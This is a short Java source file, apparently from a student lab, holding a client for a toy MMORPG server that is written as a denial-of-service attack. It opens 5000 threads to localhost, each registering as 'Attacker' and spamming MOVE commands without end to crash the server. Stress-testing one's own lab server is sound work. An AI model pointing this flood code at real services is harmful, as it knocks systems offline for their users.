package Lab_3;
import java.io.*;
import java.net.*;

public class MMORPGClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;

    void main() {
        // Combined attack: Many connections + continuous broadcast spam
        // This exhausts threads, memory, and CPU simultaneously
        for (int i = 0; i < 5000; i++) {
            final int id = i;
            new Thread(() -> {
                try {
                    Socket socket = new Socket("localhost", 12345);
                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

                    in.readLine(); // Read prompt
                    out.println("Attacker" + id); // Register with unique name

                    // Spam MOVE commands continuously to trigger broadcasts
                    while (true) {
                        out.println("MOVE:x" + id + ",y" + id);
                    }
                } catch (Exception e) {}
            }).start();

            if (i % 100 == 0) {
                System.out.println("Launched " + i + " attack threads");
            }
        }

        System.out.println("Attack launched - server should crash");
    }
}